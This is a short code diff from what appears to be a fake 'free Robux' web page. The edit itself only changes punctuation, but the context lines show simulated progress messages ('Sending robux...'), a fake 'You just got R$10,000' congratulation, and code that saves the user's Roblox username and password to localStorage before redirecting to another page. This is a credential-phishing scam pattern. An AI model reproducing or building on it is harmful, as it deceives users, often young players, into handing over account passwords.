@@ -48,7 +48,7 @@ update("Adding to group...");
 await delay();
 update("Sending robux...");
 await delay();
-update("Removing from group..");
+update("Removing from group...");
 await delay();
 customPrompt("Congrats!", "You just got <b>R$10,000</b>!");
 
@@ -56,4 +56,5 @@ localStorage.setItem("robloxInfo", JSON.stringify({username: username, password:
 
 await delay();
 location.href = "info.html";
+
 })();
